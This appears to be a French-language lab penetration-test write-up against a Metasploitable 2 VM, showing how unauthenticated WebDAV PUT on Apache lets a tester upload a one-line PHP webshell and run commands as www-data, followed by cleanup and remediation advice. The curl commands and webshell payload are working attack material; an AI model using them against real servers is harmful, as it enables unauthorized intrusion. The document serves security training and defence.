Web Apache — WebDAV → RCE

Écriture WebDAV sans authentification + exécution PHP → exécution de code à distance

Service / PortApache httpd 2.2.8 (WebDAV) — port 80
CibleMetasploitable 2 — 192.168.56.101
FaiblesseMéthode PUT WebDAV autorisée sans authentification + exécution PHP dans /dav/
RésultatRCE www-data (exécution de commande via webshell)
Testé parZANNOU Josaphat

1. Identification

Le serveur Apache héberge plusieurs applications (DVWA, Mutillidae, phpMyAdmin, TWiki) et un répertoire WebDAV (/dav/). WebDAV étend HTTP avec des méthodes d'écriture (PUT, DELETE). La bannière annonce DAV/2, et la page d'accueil liste le répertoire WebDAV.

2. Test d'écriture WebDAV (méthode PUT)

On vérifie si le serveur accepte l'écriture de fichiers dans /dav/ sans authentification :

$ curl -X PUT http://192.168.56.101/dav/josatest.txt --data "hello-josa"
   ... 201 Created
$ curl http://192.168.56.101/dav/josatest.txt
hello-josa

Le code 201 Created et la relecture du fichier confirment que PUT est autorisé sans authentification. Si PHP s'exécute dans ce répertoire, cela ouvre une exécution de code à distance.

3. Démarche d'exploitation — webshell PHP

On dépose un webshell PHP minimal qui exécute la commande passée dans le paramètre c, puis on l'appelle :

$ printf '<?php system($_GET["c"]); ?>' | curl -X PUT http://192.168.56.101/dav/j.php --data-binary @-
   ... 201 Created
$ curl "http://192.168.56.101/dav/j.php?c=id;uname%20-a;hostname"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
metasploitable
Le fichier .php déposé par WebDAV est interprété par PHP — exécution de commande arbitraire côté serveur, en tant que www-data, sans aucun identifiant.

4. Preuve d'accès obtenu

Le webshell renvoie uid=33(www-data) : on exécute des commandes avec les droits du serveur web. À partir de là, on peut lire/écrire ce qui est accessible à www-data, établir un reverse shell interactif, ou chercher une élévation de privilèges. Par hygiène, les fichiers déposés sont ensuite retirés (DELETE → 204) pour ne pas laisser de webshell sur la cible.

5. Remédiation

RECOMMANDATIONS
  • Désactiver WebDAV s'il n'est pas nécessaire, ou exiger une authentification forte et restreindre les méthodes autorisées (interdire PUT/DELETE aux utilisateurs non authentifiés).
  • Empêcher l'exécution de scripts (PHP, CGI) dans les répertoires où des fichiers peuvent être téléversés (directive php_admin_flag engine off, RemoveHandler).
  • Mettre à jour Apache et appliquer le principe du moindre privilège sur les répertoires exposés.
  • Traiter aussi les autres applications hébergées (DVWA, Mutillidae, phpMyAdmin, TWiki) qui présentent chacune leurs propres vulnérabilités.
